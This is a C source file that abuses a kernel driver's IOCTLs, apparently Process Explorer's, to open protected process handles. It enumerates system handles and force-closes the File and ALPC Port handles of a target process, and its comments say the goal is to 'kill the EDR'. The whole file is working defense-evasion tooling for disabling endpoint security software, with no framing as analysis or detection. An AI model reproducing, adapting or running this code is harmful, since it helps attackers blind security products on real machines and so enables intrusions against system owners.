#pragma once

#include "Driver.h"

BOOL close_handle(HANDLE driverHandle, Procexp_close sProcexp)
{
	DWORD bytes = 0;
	BOOL ret = DeviceIoControl(driverHandle, IOCTL_CLOSE_HANDLE, &sProcexp, sizeof(sProcexp), NULL, 0, &bytes, NULL);
	
	if (!ret) {
		printf("[-] Error closing handle. (Error Code: %lu)\n", GetLastError());
		return FALSE;
	}

	//printf("[!] Closed handle beloging to EDR: 0x%x\n", (UINT)sProcexp.handle);
	return TRUE;
}

HANDLE open_handle(ULONGLONG PID, HANDLE hDriver)
{
	HANDLE hProtectedProcess = NULL;
	DWORD dwBytesReturned = 0;
	BOOL ret = FALSE;
	char* endptr = 0;

	ret = DeviceIoControl(hDriver, IOCTL_OPEN_PROTECTED_PROCESS_HANDLE, &PID, sizeof(PID),
		&hProtectedProcess, sizeof(HANDLE), &dwBytesReturned, NULL);

	if (dwBytesReturned == 0 || !ret)
		return NULL;

	return hProtectedProcess;
}

int filter(unsigned int code)
{
	/*Spaguetti code for debugging purpose*/
	if (code == EXCEPTION_ACCESS_VIOLATION)
	{
		return EXCEPTION_EXECUTE_HANDLER;
	}
	else
		return -1;
}

BOOL kill(HANDLE hDriver, HANDLE hProc, ULONGLONG PID)
{
	Procexp_close sProcexp = { 0 };
	BOOL handle = 0;
	ULONGLONG returnLength = 0;
	fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
	PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)malloc(SystemHandleInformationSize);
	
	if (!handleTableInformation) {
		printf("[-] Error allocating memory. (Error Code: %lu)\n", GetLastError());
		return FALSE;
	}

more:
	NTSTATUS stat = NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLength);
	DWORD controler = 0;
	ULONGLONG adjustLength;
	
	while (stat == STATUS_INFO_LENGTH_MISMATCH) {
		handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)realloc(handleTableInformation, returnLength);
		adjustLength = returnLength;
		stat = NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, adjustLength, &returnLength);
		controler += 1;
	}

	if (stat != 0 && stat != STATUS_INFO_LENGTH_MISMATCH){
		printf("[-] Error getting handles: (0x%x)\n", stat);
		return FALSE;
	}

	DWORD counter = 0;
	myPUBLIC_OBJECT_TYPE_INFORMATION info;
	DWORD length;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo;

	for (ULONGLONG i = 0; i < handleTableInformation->NumberOfHandles; i++)
	{
		__try {
			handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[i];
		}
		__except (filter(GetExceptionCode())) /*Workaround to a fucking crash*/ {
			if (handle == FALSE) {
				printf("[-] returning with errors\n");
				goto more;
			}
			goto return_handle_table;
		}

		if (handleInfo.UniqueProcessId == PID) /*If process which belongs the handle is our process */
		{
			// Obtain type of handle (name)
			handle = TRUE;

			NTSTATUS stat = NtQueryObject((HANDLE)handleInfo.Handle, ObjectTypeInformation, &info, sizeof(myPUBLIC_OBJECT_TYPE_INFORMATION), &length);
			if (stat != 0) {
				if (stat == 0xc0000008)
					continue;
				
				printf("Error: (0x%x) with handle: (0x%x)\n", stat, handleInfo.Handle);
				return FALSE;
			}

			else
			{
				if (wcscmp(info.TypeName.Buffer, L"File") == 0 || wcscmp(info.TypeName.Buffer, L"ALPC Port") == 0) //Check if handle is type File
				{
					handle = TRUE;
					sProcexp.pPid = PID;
					sProcexp.handle = (ULONGLONG)handleInfo.Handle;
					sProcexp.ObjectType = (PVOID)handleInfo.Object;
					close_handle(hDriver, sProcexp); //Kill the EDR
					counter += 1;
				}
			}

			if (counter == 0x1000) {  //Buffer is not long enough (We don't usually arrive to here)
				printf("[-] Not completed\n");
				return FALSE;
			}
		}
	}

return_handle_table:
	printf("[+] Process Killed\n");
	return TRUE;
}